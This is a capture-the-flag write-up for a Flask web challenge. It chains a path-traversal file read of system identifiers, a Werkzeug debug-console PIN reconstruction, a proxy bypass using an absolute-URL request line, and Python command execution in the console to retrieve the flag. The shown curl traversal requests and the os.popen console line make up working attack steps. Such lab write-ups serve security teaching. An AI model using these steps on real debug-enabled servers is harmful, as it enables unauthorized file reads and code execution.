# My Flask App [WEB] [EASY]

> I created a Web application in Flask, what could be wrong?
>
> Author: belugagemink

## Debug Mode

Flask app is running in debug mode, so we can access a debug console on the
following URL: <http://localhost:5000/console>.

Only issue is that we need a PIN code that is logged in
the console when starting the app.

## How is the PIN code generated?

> - <https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py>
> - <https://github.com/wdahlenburg/werkzeug-debug-console-bypass>

### Username

According to the `Dockerfile`, we're running `app.py` with `nobody` user.

```Dockerfile
USER nobody
EXPOSE 5000
CMD ["python", "app.py"]
```

### Path to Flask

Let's run the Docker Compose setup locally with `docker compose up` and
`docker exec -t -i <container_id> /bin/bash` to find the path of Flask.

```console
$ find / -name "app.py" 2>/dev/null
/usr/local/lib/python3.11/site-packages/flask/app.py
/usr/local/lib/python3.11/site-packages/flask/sansio/app.py
/app/app.py
```

`/usr/local/lib/python3.11/site-packages/flask/app.py` is our path!

### MAC

```console
$ curl http://localhost:5000/view?filename=/sys/class/net/eth0/address
02:42:ac:11:00:04
```

### Machine ID

```console
$ curl http://localhost:5000/view?filename=/proc/sys/kernel/random/boot_id
db004940-aa5c-4dff-ad37-2c3e70a8b9e2
```

### Generation!

Based entirely on <https://github.com/wdahlenburg/werkzeug-debug-console-bypass/blob/main/werkzeug-pin-bypass.py>, I wrote my own version to include the previous variables and forget useless ones.

You can check the source code out at [`scripts/my_flask_app_sekaictf.js`](./scripts/my_flask_app_sekaictf.js).

```console
$ bun run ./writeups/scripts/my_flask_app_sekaictf.js
640-156-272
```

## Console Protected by Proxy

Now that we've all the keys to succeed, let's try to run an instance, get our
values and try to log into the console!

Sadly, when entering `/console`, we get a `400` HTTP error. Proxy probably
won't let us enter, how can we bypass this?

I booted up Burp Suite and intercepted requests and tweaked a little bit the
HTTP message for the requested path, from:

```
GET /console?pin=640-156-272&btn=Confirm+Pin HTTP/1.1
```

to:

```
GET http://localhost:5000/console?pin=640-156-272&btn=Confirm+Pin HTTP/1.1
```

and it let me enter!

However, I had to do this manually for each request Burp intercepted,
there's probably a better way to do this.

## Get the flag!

Since we're in a Python environment, we can easily run any command.
Let's list all the files from `/` since the `Dockerfile` moved our
flag there.

```console
> __import__('os').popen('ls /').read();
...
flag-W6CL3CglAjqwqEVAlKpUSgPFZ81G45Ht.txt
...
```

Let's grab the file using our good ol' path traversal.

```console
$ curl https://INSTANCE_URL/view?filename=/flag-W6CL3CglAjqwqEVAlKpUSgPFZ81G45Ht.txt
SEKAI{1$\_+his-3ven-<4LL3D-4-(V3}
```
